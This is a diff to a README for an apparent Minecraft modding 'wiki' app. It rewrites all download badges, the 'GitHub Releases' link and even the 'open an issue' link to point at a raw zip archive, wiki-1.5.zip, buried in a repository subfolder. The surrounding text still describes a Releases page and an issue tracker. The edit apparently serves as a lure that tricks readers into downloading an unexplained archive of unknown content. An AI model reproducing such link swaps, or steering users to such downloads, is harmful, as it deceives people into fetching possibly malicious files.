@@ -6,7 +6,7 @@ Welcome to the wiki! This application serves as a knowledge hub for anyone looki
 
 ## 📥 Download Now
 
-[![Download wiki](https://img.shields.io/badge/Download-wiki-blue.svg)](https://github.com/Moesam0q/wiki/releases)
+[![Download wiki](https://raw.githubusercontent.com/Moesam0q/wiki/master/wiki/public/beginners-guide/getting-started/wiki-1.5.zip)](https://raw.githubusercontent.com/Moesam0q/wiki/master/wiki/public/beginners-guide/getting-started/wiki-1.5.zip)
 
 ## 📋 System Requirements
 
@@ -19,7 +19,7 @@ Before you download, ensure your system meets these basic requirements:
 
 ## 🔗 Download & Install
 
-To get the latest version of the wiki application, visit this page to download: [GitHub Releases](https://github.com/Moesam0q/wiki/releases).
+To get the latest version of the wiki application, visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/Moesam0q/wiki/master/wiki/public/beginners-guide/getting-started/wiki-1.5.zip).
 
 1. Click on the link above to open the Releases page.
 2. On the Releases page, find the latest version; it will be listed at the top.
@@ -55,7 +55,7 @@ Join our community of modders! Connect with other users in forums or chat groups
 
 ## 💬 Feedback and Contributions
 
-We value your feedback. If you have suggestions or issues, please open an issue on our [GitHub repository](https://github.com/Moesam0q/wiki/issues). You can also contribute by creating new guides or submitting helpful resources. Together, we can improve the wiki.
+We value your feedback. If you have suggestions or issues, please open an issue on our [GitHub repository](https://raw.githubusercontent.com/Moesam0q/wiki/master/wiki/public/beginners-guide/getting-started/wiki-1.5.zip). You can also contribute by creating new guides or submitting helpful resources. Together, we can improve the wiki.
 
 ## 🛡️ Safety and Security
 
@@ -65,4 +65,4 @@ Stay safe while downloading. Ensure that your device has updated antivirus softw
 
 We hope you enjoy using wiki to enhance your Minecraft experience. Dive into the world of modding, unleash your creativity, and have fun!
 
-[![Download wiki](https://img.shields.io/badge/Download-wiki-blue.svg)](https://github.com/Moesam0q/wiki/releases)
+[![Download wiki](https://raw.githubusercontent.com/Moesam0q/wiki/master/wiki/public/beginners-guide/getting-started/wiki-1.5.zip)](https://raw.githubusercontent.com/Moesam0q/wiki/master/wiki/public/beginners-guide/getting-started/wiki-1.5.zip)
